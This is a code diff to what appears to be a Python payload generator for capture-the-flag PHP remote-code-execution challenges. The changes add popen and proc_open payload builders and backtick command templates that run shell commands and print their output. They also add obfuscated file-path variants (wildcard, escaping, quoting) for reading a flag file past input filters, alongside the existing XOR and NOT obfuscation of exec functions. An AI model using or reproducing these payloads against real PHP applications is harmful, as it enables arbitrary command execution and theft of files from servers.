@@ -48,16 +48,50 @@ def _base64_pipe_bypass(command: str):
     )
 
 
+def _render_backtick_payloads(command: str):
+    payloads = []
+    for template in bypass_data.BACKTICK_TEMPLATES:
+        if "{cmd}" in template:
+            payloads.append(template.format(cmd=command))
+        elif "{path}" in template:
+            payloads.append(template.format(path=command))
+    return payloads
+
+
+def _escape_php_single_quote(command: str):
+    return command.replace("\\", "\\\\").replace("'", "\\'")
+
+
+def _build_popen_payload(command: str):
+    escaped = _escape_php_single_quote(command)
+    return (
+        f"$__h=popen('{escaped}','r');"
+        "if($__h){echo stream_get_contents($__h);pclose($__h);}"
+    )
+
+
+def _build_proc_open_payload(command: str):
+    escaped = _escape_php_single_quote(command)
+    return (
+        "$__spec=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];"
+        f"$__p=proc_open('{escaped}',$__spec,$__pipes);"
+        "if(is_resource($__p)){"
+        "echo stream_get_contents($__pipes[1]);"
+        "if(isset($__pipes[0])){fclose($__pipes[0]);}"
+        "if(isset($__pipes[1])){fclose($__pipes[1]);}"
+        "if(isset($__pipes[2])){fclose($__pipes[2]);}"
+        "proc_close($__p);}"
+    )
+
+
 def _generate_php_rce_payloads(command: str, php_version: float):
     payloads = []
-
-    for template in bypass_data.BACKTICK_TEMPLATES:
-        if "{path}" in template:
-            payloads.append(template.format(path=command))
-
-    payloads.append(f"`{command}`")
+    payloads.extend(_render_backtick_payloads(command))
 
     for func in bypass_data.PHP_EXEC_WRAPPERS:
+        if func in {"popen", "proc_open"}:
+            continue
+
         if php_version >= 7.0:
             not_func = utils.generate_php_not(func)
             not_arg = utils.generate_php_not(command)
@@ -72,6 +106,11 @@ def _generate_php_rce_payloads(command: str, php_version: float):
         inc_func_code = utils.generate_php_increment(func)
         if inc_func_code and xor_arg:
             payloads.append(f"{inc_func_code};$_____({xor_arg});")
+
+    if "popen" in bypass_data.PHP_EXEC_WRAPPERS:
+        payloads.append(_build_popen_payload(command))
+    if "proc_open" in bypass_data.PHP_EXEC_WRAPPERS:
+        payloads.append(_build_proc_open_payload(command))
 
     return payloads
 
@@ -107,8 +146,16 @@ def generate_candidates(options: BypassOptions):
                 payloads.append(template.format(path=utils.obfuscate_filename_escape(options.flagfile), keyword="flag"))
                 payloads.append(template.format(path=utils.obfuscate_filename_quotes(options.flagfile), keyword="flag"))
 
-            for template in bypass_data.BACKTICK_TEMPLATES:
-                payloads.append(template.format(path=options.flagfile))
+            path_variants = [
+                options.flagfile,
+                _wildcard_bypass(options.flagfile),
+                utils.obfuscate_filename_escape(options.flagfile),
+                utils.obfuscate_filename_quotes(options.flagfile),
+            ]
+            for cmd_template in bypass_data.BACKTICK_COMMAND_TEMPLATES:
+                for path_variant in path_variants:
+                    cmd = cmd_template.format(path=path_variant)
+                    payloads.extend(_render_backtick_payloads(cmd))
 
             for template in bypass_data.INCLUDE_TEMPLATES:
                 payloads.append(template.format(path=options.flagfile))
